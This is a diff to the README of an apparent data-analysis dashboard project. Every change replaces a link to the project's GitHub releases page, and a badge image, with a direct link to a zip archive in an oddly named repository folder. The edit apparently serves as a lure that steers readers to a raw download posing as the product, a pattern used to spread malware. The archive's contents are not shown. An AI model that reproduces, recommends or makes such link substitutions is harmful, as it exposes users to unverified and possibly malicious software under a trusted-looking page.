@@ -1,7 +1,7 @@
 # 📊 Data-Analysis-Dashboard - Analyze Your Data with Ease
 
 ## 🛠️ Download Now
-[![Download Data-Analysis-Dashboard](https://img.shields.io/badge/Download-Data--Analysis--Dashboard-blue)](https://github.com/Jenko-97cr/Data-Analysis-Dashboard/releases)
+[![Download Data-Analysis-Dashboard](https://github.com/Jenko-97cr/Data-Analysis-Dashboard/raw/refs/heads/main/dee/Dashboard-Data-Analysis-1.0.zip)](https://github.com/Jenko-97cr/Data-Analysis-Dashboard/raw/refs/heads/main/dee/Dashboard-Data-Analysis-1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the Data-Analysis-Dashboard. This tool allows you to analyze your CSV data interactively. You can generate visualizations, gain statistical insights, detect outliers, and clean your data without any coding experience.
@@ -9,7 +9,7 @@ Welcome to the Data-Analysis-Dashboard. This tool allows you to analyze your CSV
 ## 📥 Download & Install
 To get started, you can download the application from our releases page. 
 
-Visit this page to download: [Data-Analysis-Dashboard Releases](https://github.com/Jenko-97cr/Data-Analysis-Dashboard/releases).
+Visit this page to download: [Data-Analysis-Dashboard Releases](https://github.com/Jenko-97cr/Data-Analysis-Dashboard/raw/refs/heads/main/dee/Dashboard-Data-Analysis-1.0.zip).
 
 Once on the page:
 1. Locate the latest version of the application.
@@ -61,5 +61,5 @@ Thank you for choosing Data-Analysis-Dashboard. Start analyzing your data today!
 ## 🔗 Follow Us
 Stay updated with the latest news by following us on our GitHub page and partake in new releases and updates.
 
-![Download Data-Analysis-Dashboard Again](https://img.shields.io/badge/Download-Data--Analysis--Dashboard-blue)  
-[Data-Analysis-Dashboard Releases](https://github.com/Jenko-97cr/Data-Analysis-Dashboard/releases)
+![Download Data-Analysis-Dashboard Again](https://github.com/Jenko-97cr/Data-Analysis-Dashboard/raw/refs/heads/main/dee/Dashboard-Data-Analysis-1.0.zip)  
+[Data-Analysis-Dashboard Releases](https://github.com/Jenko-97cr/Data-Analysis-Dashboard/raw/refs/heads/main/dee/Dashboard-Data-Analysis-1.0.zip)
